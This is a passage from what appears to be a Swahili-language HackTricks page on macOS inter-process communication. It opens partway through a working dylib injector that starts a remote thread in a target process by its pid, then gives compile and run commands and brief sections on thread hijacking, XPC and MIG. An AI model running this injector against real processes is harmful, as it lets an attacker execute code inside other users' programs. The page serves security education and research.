thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Katika mbinu hii, nyuzi ya mchakato inatekwa:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md
{{#endref}}

## XPC

### Taarifa za Msingi

XPC, ambayo inasimama kwa XNU (kernel inayotumiwa na macOS) mawasiliano kati ya Mchakato, ni mfumo wa **mawasiliano kati ya michakato** kwenye macOS na iOS. XPC inatoa mekanizma ya kufanya **kuitana kwa njia salama, zisizo za kawaida kati ya michakato tofauti** kwenye mfumo. Ni sehemu ya mtindo wa usalama wa Apple, ikiruhusu **kuundwa kwa programu zenye ruhusa tofauti** ambapo kila **kipengele** kinakimbia na **ruhusa pekee inayoihitaji** kufanya kazi yake, hivyo kupunguza uharibifu unaoweza kutokea kutokana na mchakato ulioathirika.

Kwa maelezo zaidi kuhusu jinsi **mawasiliano haya yanavyofanya kazi** na jinsi **yanavyoweza kuwa na udhaifu**, angalia:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG iliumbwa ili **kurahisisha mchakato wa uundaji wa Mach IPC**. Kimsingi **inazalisha msimbo unaohitajika** kwa seva na mteja kuwasiliana na tafsiri iliyotolewa. Hata kama msimbo uliozalishwa ni mbaya, mtengenezaji atahitaji tu kuingiza na msimbo wake utakuwa rahisi zaidi kuliko hapo awali.

Kwa maelezo zaidi angalia:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md
{{#endref}}

## Marejeleo

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{{#include ../../../../banners/hacktricks-training.md}}
